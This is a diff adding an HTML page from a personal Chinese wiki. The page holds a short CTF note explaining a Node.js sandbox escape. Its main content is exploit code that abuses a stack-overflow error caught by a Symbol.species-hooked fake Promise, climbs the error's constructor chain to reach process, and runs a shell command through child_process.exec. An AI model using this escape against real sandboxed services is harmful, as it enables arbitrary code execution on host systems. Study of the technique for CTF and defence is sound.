@@ -1,0 +1,243 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>JS沙箱逃逸能想出的这群人也是奇才 | Someone&#39;s Wiki</title>
+<link rel="shortcut icon" href="https://raye.ink/favicon.ico?v=1707098994706">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://raye.ink/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="JS沙箱逃逸能想出的这群人也是奇才 | Someone&#39;s Wiki - Atom Feed" href="https://raye.ink/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="这里用到了好几个技术点：
+
+异步函数
+无线递归调用栈
+重写构造函数
+[Symbol.species] 允许定义创建派生对象时应使用的构造函数，其实就是hook后续的 then() 函数
+
+async function fn() {
+    ..." />
+    <meta name="keywords" content="CTF,JS" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://raye.ink">
+  <img class="avatar" src="https://raye.ink/images/avatar.png?v=1707098994706" alt="">
+  </a>
+  <h1 class="site-title">
+    Someone&#39;s Wiki
+  </h1>
+  <p class="site-description">
+    不过是某个人的一些记录罢了
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/rayepeng" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/rayepeng_" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              JS沙箱逃逸能想出的这群人也是奇才
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-02-05
+              </span>
+              <span>
+                1 min read
+              </span>
+              
+                <a href="https://raye.ink/tag/-ade9yUNk/" class="post-tag">
+                  # CTF
+                </a>
+              
+                <a href="https://raye.ink/tag/GlpR___to/" class="post-tag">
+                  # JS
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>这里用到了好几个技术点：</p>
+<ol>
+<li>异步函数</li>
+<li>无线递归调用栈</li>
+<li>重写构造函数</li>
+<li><code>[Symbol.species]</code> 允许定义创建派生对象时应使用的构造函数，其实就是hook后续的 <code>then()</code> 函数</li>
+</ol>
+<pre><code class="language-js">async function fn() {
+    (function stack() {
+        new Error().stack;
+        stack();
+    })();
+}
+p = fn();
+p.constructor = {
+    [Symbol.species]: class FakePromise {
+        constructor(executor) {
+            executor(
+                (x) =&gt; x,
+                (err) =&gt; { return err.constructor.constructor('return process')().mainModule.require('child_process').exec('ping baidu.com -c 3', (error, stdout, stderr) =&gt; {
+                        // 在这里处理 stdout 或 stderr
+                        throw new Error(stdout);
+                    }); 
+                }
+            )
+        }
+    }
+};
+p.then();
+</code></pre>
+<p>不过这个环境还并不直接输出回显，但是有报错信息，所以可以考虑将其报错显示出来，哦上面的代码已经是了</p>
+<p>因为一般我们会用 <code>require('child_process').execSync('cmd')</code> 来执行命令（</p>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://raye.ink/post/lesslessyou-sheng-zhi-nian-greatergreater/">
+              <h3 class="post-title">
+                《有生之年》
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+
+          
+            <link rel="stylesheet" href="https://unpkg.com/disqusjs@1.1/dist/disqusjs.css">
+<script src="https://unpkg.com/disqusjs@1.1/dist/disqus.js"></script>
+
+<div id="disqus_thread"></div>
+
+<script>
+
+var options = {
+  shortname: '',
+  apikey: 'MGvpmGarYXI5usdQZQLgAMohCbgUaFNzdQ8Um3aEgtFx6GnBbyfcjGuN7kQVzC4p',
+}
+if ('') {
+  options.api = ''
+}
+var dsqjs = new DisqusJS(options)
+
+</script>
+
+          
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://raye.ink/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
